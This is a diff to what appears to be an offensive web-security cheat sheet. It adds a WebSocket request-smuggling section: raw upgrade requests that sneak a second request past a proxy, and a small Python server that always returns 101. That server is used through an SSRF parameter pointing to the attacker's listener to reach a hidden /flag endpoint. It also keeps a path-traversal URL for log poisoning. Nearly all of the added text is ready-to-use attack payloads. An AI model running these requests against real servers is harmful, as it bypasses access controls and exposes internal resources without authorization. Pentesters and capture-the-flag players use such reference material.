@@ -66,6 +66,7 @@
 - [Upload Vulnerabilities](#upload-vulnerabilities)
 - [waybackurls](#waybackurls)
 - [Web Log Poisoning](#web-log-poisoning)
+- [Websocket Request Smuggling](#websocket-request-smuggling)
 - [Wfuzz](#wfuzz)
 - [WhatWeb](#whatweb)
 - [Wordpress](#wordpress)
@@ -4017,6 +4018,67 @@ Connection: close
 
 ```c
 http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log
+```
+
+## Websocket Request Smuggling
+
+### Request Example
+
+- Disable `Update Content-Length`
+
+```c
+GET /socket HTTP/1.1
+Host: <RHOST>:<RPORT>
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /<FILE> HTTP/1.1
+Host: <RHOST>:<RPORT>
+
+
+```
+
+### Server-Side Request Forgery (SSRF) Example
+
+#### Fake Webserver
+
+```c
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+if len(sys.argv)-1 != 1:
+    print("""
+Usage: {} 
+    """.format(sys.argv[0]))
+    sys.exit()
+
+class Redirect(BaseHTTPRequestHandler):
+   def do_GET(self):
+       self.protocol_version = "HTTP/1.1"
+       self.send_response(101)
+       self.end_headers()
+
+HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
+```
+
+```c
+$ python3 webserver.py <LPORT>
+```
+
+```c
+GET /check-url?server=http://<LHOST>:<LPORT> HTTP/1.1
+Host: <RHOST>:<RPORT>
+Sec-WebSocket-Version: 13
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /flag HTTP/1.1
+Host: <RHOST>:<RPORT>
+
+
 ```
 
 ## Wfuzz
